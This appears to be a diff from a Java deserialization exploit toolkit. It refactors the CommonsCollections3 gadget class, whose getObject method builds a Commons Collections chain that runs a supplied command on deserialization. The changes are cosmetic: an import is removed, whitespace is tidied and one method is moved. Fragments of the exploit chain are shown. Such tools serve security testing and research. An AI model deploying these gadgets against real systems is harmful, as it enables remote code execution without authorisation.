@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -19,17 +18,19 @@ import java.util.HashMap;
 import java.util.Map;
 
 
-
-
 /**
  * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
  * InvokerTransformer.
  */
 
-@SuppressWarnings({"rawtypes", "unchecked", "restriction","unused"})
+@SuppressWarnings({"rawtypes", "unchecked", "restriction", "unused"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.FROHOFF})
 public class CommonsCollections3 implements ObjectPayload<Object> {
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAnnInvHUniversalMethodImpl();
+    }
 
     public Object getObject(String command) throws Exception {
         final Object templatesImpl;
@@ -54,9 +55,5 @@ public class CommonsCollections3 implements ObjectPayload<Object> {
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
         return handler;
-    }
-
-    public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
 }
